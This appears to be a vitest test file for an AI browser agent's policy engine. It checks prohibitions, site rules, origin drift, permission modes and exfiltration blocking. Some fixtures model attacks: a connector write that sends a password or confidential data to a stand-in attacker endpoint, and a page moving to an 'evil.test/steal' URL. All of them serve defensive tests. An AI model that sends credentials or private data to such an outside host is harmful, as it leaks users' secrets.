/**
 * TEST-SECURITY-005 / TEST-POLICY-001 — Policy engine (REQ-POLICY-001).
 *
 * The policy engine is the sole authority on whether a tool call may run.
 * These tests assert the ordering guarantee: every stage can only make the
 * decision stricter, and no permission mode unlocks a hard prohibition.
 */
import { describe, expect, it } from 'vitest';
import {
  evaluatePolicy,
  PERMISSION_MODES,
  type PermissionMode,
  type PolicyContext,
  type PolicyRequest,
} from '@/policy/policy-engine';
import { emptySitePolicyState, upsertRule, type GrantableRiskLevel } from '@/policy/site-policy';

const context = (mode: PermissionMode = 'auto'): PolicyContext => ({
  mode,
  sitePolicy: emptySitePolicyState(),
});

const request = (overrides: Partial<PolicyRequest> = {}): PolicyRequest => ({
  tool: 'browser.click',
  taskId: 'task_1',
  risk: 'R1',
  ...overrides,
});

describe('hard prohibitions', () => {
  it('denies a prohibited category in every permission mode', () => {
    for (const mode of PERMISSION_MODES) {
      const decision = evaluatePolicy(
        request({ prohibited: ['financial_transaction'], risk: 'R0' }),
        context(mode),
      );
      expect(decision.verdict, `mode=${mode}`).toBe('DENY');
      expect(decision.code).toBe('PROHIBITED_ACTION');
    }
  });

  it('denies R5 outright even in skip mode', () => {
    const decision = evaluatePolicy(request({ risk: 'R5' }), context('skip'));
    expect(decision.verdict).toBe('DENY');
  });

  it('cannot be unlocked by a site allowlist entry', () => {
    const sitePolicy = upsertRule(emptySitePolicyState(), {
      site: 'example.com',
      decision: 'allow',
      // A grant the type no longer admits, constructed on purpose: what is
      // under test is the engine's behaviour if a record like this reaches it
      // from an older build or a hostile import, not whether it compiles.
      maxRisk: 'R5' as GrantableRiskLevel,
      createdAt: 0,
    });
    const decision = evaluatePolicy(
      request({ prohibited: ['permanent_deletion'], targetUrl: 'https://example.com/x' }),
      { mode: 'skip', sitePolicy },
    );
    expect(decision.verdict).toBe('DENY');
  });
});

describe('site rules', () => {
  it('denies an action on a blocked site', () => {
    const sitePolicy = upsertRule(emptySitePolicyState(), {
      site: 'blocked.test',
      decision: 'block',
      maxRisk: 'R0',
      createdAt: 0,
    });
    const decision = evaluatePolicy(request({ targetUrl: 'https://blocked.test/page' }), {
      mode: 'skip',
      sitePolicy,
    });
    expect(decision.verdict).toBe('DENY');
    expect(decision.code).toBe('SITE_BLOCKED');
  });

  it('a block on a site also covers its subdomains', () => {
    const sitePolicy = upsertRule(emptySitePolicyState(), {
      site: 'blocked.test',
      decision: 'block',
      maxRisk: 'R0',
      createdAt: 0,
    });
    const decision = evaluatePolicy(request({ targetUrl: 'https://app.blocked.test/page' }), {
      mode: 'auto',
      sitePolicy,
    });
    expect(decision.verdict).toBe('DENY');
  });

  it('auto-approves up to the risk a site rule covers', () => {
    const sitePolicy = upsertRule(emptySitePolicyState(), {
      site: 'trusted.test',
      decision: 'allow',
      maxRisk: 'R2',
      createdAt: 0,
    });
    const allowed = evaluatePolicy(
      request({ risk: 'R2', targetUrl: 'https://trusted.test/page' }),
      { mode: 'auto', sitePolicy },
    );
    expect(allowed.verdict).toBe('ALLOW');
    expect(allowed.code).toBe('SITE_ALLOWED');
  });

  it('still prompts above the risk a site rule covers', () => {
    const sitePolicy = upsertRule(emptySitePolicyState(), {
      site: 'trusted.test',
      decision: 'allow',
      maxRisk: 'R1',
      createdAt: 0,
    });
    const decision = evaluatePolicy(
      request({ risk: 'R2', targetUrl: 'https://trusted.test/page' }),
      { mode: 'auto', sitePolicy },
    );
    expect(decision.verdict).toBe('ALLOW_WITH_CONFIRMATION');
  });
});

describe('origin handling', () => {
  it('denies an action targeting a non-automatable scheme', () => {
    const decision = evaluatePolicy(request({ targetUrl: 'chrome://settings' }), context());
    expect(decision.verdict).toBe('DENY');
    expect(decision.code).toBe('ORIGIN_NOT_AUTOMATABLE');
  });

  // Drift is `plannedUrl` against `currentUrl` — where the page was when the
  // model was asked, against where it is now. These cases used to compare
  // against `targetUrl`, which is a navigation *destination*: only
  // `browser.navigate` supplies one, so the check could not run for any page
  // tool, and for `browser.navigate` it compared a destination against
  // itself. They pinned a comparison the product could never make.
  it('requires confirmation when the page moved after planning', () => {
    const decision = evaluatePolicy(
      request({
        risk: 'R1',
        plannedUrl: 'https://bank.test/transfer',
        currentUrl: 'https://evil.test/steal',
      }),
      context('skip'),
    );
    expect(decision.verdict).toBe('ALLOW_WITH_CONFIRMATION');
    expect(decision.code).toBe('ORIGIN_CHANGED');
  });

  it('tolerates the page moving under a read-only action', () => {
    const decision = evaluatePolicy(
      request({
        tool: 'browser.read_page',
        risk: 'R0',
        plannedUrl: 'https://a.test/page',
        currentUrl: 'https://b.test/page',
      }),
      context('auto'),
    );
    expect(decision.verdict).toBe('ALLOW');
  });

  it('ignores movement within the same origin', () => {
    const decision = evaluatePolicy(
      request({
        risk: 'R1',
        plannedUrl: 'https://example.com/a',
        currentUrl: 'https://example.com/b',
      }),
      context('skip'),
    );
    expect(decision.verdict).toBe('ALLOW');
  });

  it('does not treat a navigation as the page moving', () => {
    // `browser.navigate` names a destination and stands on the page it is
    // leaving. Reporting that as drift would confirm every cross-site
    // navigation, which is the one thing navigation is for.
    const decision = evaluatePolicy(
      request({
        tool: 'browser.navigate',
        risk: 'R1',
        plannedUrl: 'https://example.com/start',
        currentUrl: 'https://example.com/start',
        targetUrl: 'https://elsewhere.test/landing',
      }),
      context('skip'),
    );
    expect(decision.verdict).toBe('ALLOW');
    expect(decision.code).not.toBe('ORIGIN_CHANGED');
  });

  it('makes no comparison when either side is unknown', () => {
    // Not knowing where a page is says nothing about whether it moved. The
    // call is judged on everything else rather than on a guess — and the case
    // exists so that "no drift reported" cannot be reached by simply omitting
    // a field, which is how the previous shape passed vacuously.
    const plannedOnly = evaluatePolicy(
      request({ risk: 'R1', plannedUrl: 'https://a.test/page' }),
      context('skip'),
    );
    expect(plannedOnly.code).not.toBe('ORIGIN_CHANGED');

    const currentOnly = evaluatePolicy(
      request({ risk: 'R1', currentUrl: 'https://b.test/page' }),
      context('skip'),
    );
    expect(currentOnly.code).not.toBe('ORIGIN_CHANGED');
  });
});

describe('exfiltration integration', () => {
  it('denies a write carrying a credential', () => {
    const decision = evaluatePolicy(
      request({
        tool: 'connector.write',
        risk: 'R3',
        writeDestination: 'https://attacker.test/hook',
        writePayload: { password: 'hunter2' },
      }),
      context('skip'),
    );
    expect(decision.verdict).toBe('DENY');
    expect(decision.code).toBe('EXFILTRATION_BLOCKED');
  });

  it('requires confirmation for private data crossing to a new site', () => {
    const decision = evaluatePolicy(
      request({
        tool: 'connector.write',
        risk: 'R2',
        writeDestination: 'https://attacker.test/hook',
        writePayload: { body: 'internal roadmap' },
        taintState: {
          kind: 'TAINTED' as const,
          sources: [{ sourceType: 'jira', site: 'atlassian.net', sensitivity: 'confidential' }],
        },
      }),
      context('skip'),
    );
    expect(decision.verdict).toBe('ALLOW_WITH_CONFIRMATION');
    expect(decision.code).toBe('EXFILTRATION_CONFIRM');
    // The risk is escalated so the prompt reflects what is really happening.
    expect(decision.effectiveRisk).toBe('R3');
  });
});

describe('permission modes', () => {
  it('manual prompts for anything that changes state', () => {
    expect(evaluatePolicy(request({ risk: 'R1' }), context('manual')).verdict).toBe(
      'ALLOW_WITH_CONFIRMATION',
    );
  });

  it('manual still allows read-only actions without prompting', () => {
    expect(evaluatePolicy(request({ risk: 'R0' }), context('manual')).verdict).toBe('ALLOW');
  });

  it('auto allows low-risk actions and prompts for changes', () => {
    expect(evaluatePolicy(request({ risk: 'R1' }), context('auto')).verdict).toBe('ALLOW');
    expect(evaluatePolicy(request({ risk: 'R2' }), context('auto')).verdict).toBe(
      'ALLOW_WITH_CONFIRMATION',
    );
  });

  it('skip does not prompt for ordinary actions', () => {
    expect(evaluatePolicy(request({ risk: 'R2' }), context('skip')).verdict).toBe('ALLOW');
    expect(evaluatePolicy(request({ risk: 'R2' }), context('skip')).code).toBe('MODE_SKIP');
  });

  it('skip is not unrestricted: R3 and above always confirm', () => {
    // This is the specification section 18 guarantee that Auto/Skip never
    // become a blanket grant.
    for (const risk of ['R3', 'R4'] as const) {
      const decision = evaluatePolicy(request({ risk }), context('skip'));
      expect(decision.verdict, `risk=${risk}`).toBe('ALLOW_WITH_CONFIRMATION');
      expect(decision.code).toBe('RISK_REQUIRES_APPROVAL');
    }
  });

  it('never returns a verdict looser than the strictest applicable stage', () => {
    // Property check across the risk/mode matrix: a DENY must never appear as
    // ALLOW under a more permissive mode when a prohibition is present.
    for (const mode of PERMISSION_MODES) {
      for (const risk of ['R0', 'R1', 'R2', 'R3', 'R4', 'R5'] as const) {
        const withProhibition = evaluatePolicy(
          request({ risk, prohibited: ['account_creation'] }),
          context(mode),
        );
        expect(withProhibition.verdict).toBe('DENY');
      }
    }
  });
});
